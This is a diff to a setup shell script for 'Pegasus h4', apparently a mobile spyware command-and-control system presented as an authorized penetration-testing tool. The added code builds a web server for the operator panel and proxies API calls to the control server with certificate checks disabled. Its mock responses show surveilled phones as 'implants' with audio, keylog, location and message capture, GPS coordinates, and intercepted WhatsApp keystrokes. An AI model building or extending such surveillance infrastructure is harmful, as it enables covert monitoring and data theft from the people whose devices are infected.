@@ -2850,3 +2850,281 @@ cat > "$PROJECT_DIR/README.md" << 'MDEOF'
 **Authorized Penetration Testing Tool — For Use on Owned Systems Only**
 
 ## Architecture
+# ============================================================
+# 11. Simple HTTP Server to serve the UI directly on a port
+# ============================================================
+info "إنشاء خادم ويب لخدمة الواجهة على بورت..."
+
+cat > "$PROJECT_DIR/serve-ui.sh" << 'SERVEEOF'
+#!/bin/bash
+# Pegasus UI Server
+# Serves the HTML UI on a configurable port
+# Usage: ./serve-ui.sh [port] [interface]
+
+PORT=${1:-8080}
+INTERFACE=${2:-0.0.0.0}
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+UI_FILE="$SCRIPT_DIR/../pegasus-ui.html"
+
+# Check if the UI file exists
+if [ ! -f "$UI_FILE" ]; then
+    # Try alternate locations
+    if [ -f "$SCRIPT_DIR/pegasus-ui.html" ]; then
+        UI_FILE="$SCRIPT_DIR/pegasus-ui.html"
+    elif [ -f "./pegasus-ui.html" ]; then
+        UI_FILE="./pegasus-ui.html"
+    else
+        echo "[!] Error: pegasus-ui.html not found!"
+        echo "    Looked in:"
+        echo "      - $UI_FILE"
+        echo "      - $SCRIPT_DIR/pegasus-ui.html"
+        echo "      - ./pegasus-ui.html"
+        exit 1
+    fi
+fi
+
+echo "=========================================="
+echo "  Pegasus h4 — UI Server"
+echo "=========================================="
+echo "  Port:       $PORT"
+echo "  Interface:  $INTERFACE"
+echo "  UI File:    $UI_FILE"
+echo "  Size:       $(wc -c < "$UI_FILE") bytes"
+echo "=========================================="
+echo ""
+echo "  Open in browser: http://$INTERFACE:$PORT"
+echo "  (or http://localhost:$PORT on this machine)"
+echo ""
+echo "  Press Ctrl+C to stop"
+echo "=========================================="
+echo ""
+
+# Method 1: Use Python (most compatible)
+if command -v python3 &> /dev/null; then
+    cat > /tmp/pegasus_httpd.py << 'PYSRVEOF'
+#!/usr/bin/env python3
+"""Pegasus h4 — Simple HTTP Server for UI"""
+import http.server
+import os
+import sys
+
+PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
+INTERFACE = sys.argv[2] if len(sys.argv) > 2 else "0.0.0.0"
+UI_FILE = sys.argv[3] if len(sys.argv) > 3 else "pegasus-ui.html"
+
+class PegasusHandler(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        # Serve the UI file for all routes (SPA-style)
+        self.send_response(200)
+        self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Access-Control-Allow-Origin", "*")
+        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
+        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
+        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
+        self.send_header("Pragma", "no-cache")
+        self.send_header("Expires", "0")
+        self.send_header("X-Content-Type-Options", "nosniff")
+        self.send_header("X-Frame-Options", "SAMEORIGIN")
+        self.end_headers()
+        
+        try:
+            with open(UI_FILE, "rb") as f:
+                content = f.read()
+                self.wfile.write(content)
+        except FileNotFoundError:
+            self.wfile.write(b"<html><body><h1>Pegasus UI Not Found</h1></body></html>")
+    
+    def do_POST(self):
+        # Handle API proxy requests if needed
+        content_length = int(self.headers.get('Content-Length', 0))
+        body = self.rfile.read(content_length) if content_length > 0 else b""
+        
+        # If it's an API call, proxy to h4 server
+        if self.path.startswith("/api/"):
+            import urllib.request
+            import json
+            
+            # Try to proxy to the h4 server
+            h4_host = os.environ.get("H4_SERVER", "localhost:8443")
+            proxy_url = f"https://{h4_host}{self.path}"
+            
+            try:
+                req = urllib.request.Request(
+                    proxy_url,
+                    data=body if content_length > 0 else None,
+                    headers={
+                        "Content-Type": self.headers.get("Content-Type", "application/json"),
+                        "Authorization": self.headers.get("Authorization", ""),
+                    },
+                    method="POST"
+                )
+                # Use unverified SSL for self-signed certs
+                import ssl
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                
+                with urllib.request.urlopen(req, context=ctx, timeout=10) as response:
+                    resp_body = response.read()
+                    self.send_response(response.status)
+                    self.send_header("Content-Type", "application/json")
+                    self.send_header("Access-Control-Allow-Origin", "*")
+                    self.end_headers()
+                    self.wfile.write(resp_body)
+            except Exception as e:
+                # If h4 server is not available, return mock data
+                self.send_response(200)
+                self.send_header("Content-Type", "application/json")
+                self.send_header("Access-Control-Allow-Origin", "*")
+                self.end_headers()
+                
+                if "login" in self.path:
+                    mock = {
+                        "token": "mock_token_for_development",
+                        "user_id": "dev_admin",
+                        "username": "admin",
+                        "role": "admin"
+                    }
+                    self.wfile.write(json.dumps(mock).encode())
+                elif "stats" in self.path:
+                    mock = {
+                        "total_implants": 3,
+                        "online_now": 2,
+                        "new_today": 1,
+                        "data_collected_bytes": 15728640,
+                        "data_by_type": {"audio": 45, "keylog": 128, "location": 67, "file": 23, "screenshot": 12, "message": 89},
+                        "geographic_spread": 2,
+                        "top_countries": [{"country": "US", "count": 2}, {"country": "DE", "count": 1}],
+                        "active_commands": 1
+                    }
+                    self.wfile.write(json.dumps(mock).encode())
+                elif "implants" in self.path and not "commands" in self.path:
+                    mock = {
+                        "implants": [
+                            {"id": "a1b2c3d4e5f6", "device_name": "iPhone 15 Pro", "platform": "ios", "os_version": "17.2", "status": "online", "last_seen": "2026-06-17T10:30:00Z", "country": "US", "battery_level": 85, "modules": ["audio","keylog","location","messages"], "tags": ["high_value"]},
+                            {"id": "f7e8d9c0b1a2", "device_name": "Galaxy S24", "platform": "android", "os_version": "14.0", "status": "online", "last_seen": "2026-06-17T10:28:00Z", "country": "DE", "battery_level": 62, "modules": ["audio","keylog","location","files"], "tags": []},
+                            {"id": "c3d4e5f6a7b8", "device_name": "Pixel 8", "platform": "android", "os_version": "14.1", "status": "offline", "last_seen": "2026-06-16T22:15:00Z", "country": "US", "battery_level": 12, "modules": ["keylog","location"], "tags": ["test"]}
+                        ]
+                    }
+                    self.wfile.write(json.dumps(mock).encode())
+                elif "map" in self.path:
+                    mock = {
+                        "points": [
+                            {"id": "a1b2c3d4", "device": "iPhone 15 Pro", "lat": 40.7128, "lon": -74.0060, "status": "online"},
+                            {"id": "f7e8d9c0", "device": "Galaxy S24", "lat": 52.5200, "lon": 13.4050, "status": "online"},
+                            {"id": "c3d4e5f6", "device": "Pixel 8", "lat": 34.0522, "lon": -118.2437, "status": "offline"}
+                        ]
+                    }
+                    self.wfile.write(json.dumps(mock).encode())
+                elif "timeline" in self.path:
+                    mock = {
+                        "events": [
+                            {"id": "1", "implant_id": "a1b2c3d4", "type": "audio", "timestamp": int(__import__('time').time()) - 120, "size": 65536},
+                            {"id": "2", "implant_id": "f7e8d9c0", "type": "keylog", "timestamp": int(__import__('time').time()) - 60, "size": 2048},
+                            {"id": "3", "implant_id": "a1b2c3d4", "type": "location", "timestamp": int(__import__('time').time()) - 30, "size": 512}
+                        ]
+                    }
+                    self.wfile.write(json.dumps(mock).encode())
+                elif "data" in self.path:
+                    mock = {
+                        "data": [
+                            {"id": "d1", "implant_id": "a1b2c3d4", "type": "audio", "sub_type": "call", "timestamp": int(__import__('time').time()) - 300, "data": {}, "size": 65536, "encrypted": True, "checksum": "a1b2c3d4"},
+                            {"id": "d2", "implant_id": "f7e8d9c0", "type": "keylog", "sub_type": "whatsapp", "timestamp": int(__import__('time').time()) - 180, "data": {}, "size": 2048, "encrypted": True, "checksum": "e5f6a7b8"}
+                        ]
+                    }
+                    self.wfile.write(json.dumps(mock).encode())
+                else:
+                    self.wfile.write(json.dumps({"status": "ok", "mock": True}).encode())
+        else:
+            # Serve UI file for non-API POST
+            self.do_GET()
+    
+    def do_OPTIONS(self):
+        self.send_response(200)
+        self.send_header("Access-Control-Allow-Origin", "*")
+        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
+        self.send_header("Access-Control-Allow-Headers", "Content-Type, Authorization")
+        self.send_header("Access-Control-Max-Age", "86400")
+        self.end_headers()
+    
+    def log_message(self, format, *args):
+        """Suppress default logging"""
+        pass  # Comment this line to enable request logging
+
+if __name__ == "__main__":
+    server = http.server.HTTPServer((INTERFACE, PORT), PegasusHandler)
+    server.serve_forever()
+PYSRVEOF
+    
+    # Run the server
+    python3 /tmp/pegasus_httpd.py "$PORT" "$INTERFACE" "$UI_FILE"
+
+# Method 2: Use Node.js http-server if available
+elif command -v npx &> /dev/null; then
+    echo "[*] Using npx http-server..."
+    cd "$(dirname "$UI_FILE")"
+    npx http-server -p "$PORT" -a "$INTERFACE" -c-1 --cors
+    
+# Method 3: Use busybox httpd (embedded systems)
+elif command -v busybox &> /dev/null; then
+    echo "[*] Using busybox httpd..."
+    cd "$(dirname "$UI_FILE")"
+    ln -sf "$UI_FILE" index.html 2>/dev/null
+    busybox httpd -f -p "$PORT:$INTERFACE"
+    
+# Method 4: Pure bash server (last resort)
+else
+    echo "[!] No Python or Node.js found. Using bash server (basic)..."
+    
+    # Copy UI file to current directory with proper name
+    cp "$UI_FILE" "./index.html" 2>/dev/null || true
+    
+    while true; do
+        # Listen on the port using bash's /dev/tcp
+        # This is a very basic implementation
+        echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nAccess-Control-Allow-Origin: *\r\n\r\n$(cat "$UI_FILE")" | nc -l -p "$PORT" -q 1 2>/dev/null || true
+    done
+fi
+SERVEEOF
+
+chmod +x "$PROJECT_DIR/serve-ui.sh"
+
+# Also create a convenience script in the root
+cat > "serve-ui.sh" << 'ROOTSERVEEOF'
+#!/bin/bash
+# Convenience script to serve the Pegasus UI
+SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
+
+if [ -f "$SCRIPT_DIR/pegasus-h4/serve-ui.sh" ]; then
+    exec bash "$SCRIPT_DIR/pegasus-h4/serve-ui.sh" "$@"
+elif [ -f "$SCRIPT_DIR/serve-ui.sh" ]; then
+    exec bash "$SCRIPT_DIR/serve-ui.sh" "$@"
+else
+    echo "[!] Error: serve-ui.sh not found."
+    echo "    Run this script from the project root directory."
+    exit 1
+fi
+ROOTSERVEEOF
+chmod +x "serve-ui.sh"
+
+ok "تم إنشاء خادم الويب لخدمة الواجهة على بورت"
+echo ""
+echo "=========================================="
+echo -e "${GREEN}  ✓ كل شيء جاهز!${NC}"
+echo "=========================================="
+echo ""
+echo "  لتشغيل الواجهة مباشرة على بورت:"
+echo ""
+echo "    bash serve-ui.sh [PORT] [INTERFACE]"
+echo ""
+echo "  أمثلة:"
+echo "    bash serve-ui.sh              # http://0.0.0.0:8080"
+echo "    bash serve-ui.sh 3000         # http://0.0.0.0:3000"
+echo "    bash serve-ui.sh 80 127.0.0.1 # http://127.0.0.1:80"
+echo ""
+echo "  سيعمل حتى بدون Docker أو PostgreSQL!"
+echo "  (يستخدم بيانات وهمية للعرض عندما لا يكون الخادم متاحًا)"
+echo ""
+echo "  أو استخدم Docker للنسخة الكاملة:"
+echo "    cd pegasus-h4 && bash deploy.sh"
+echo "=========================================="
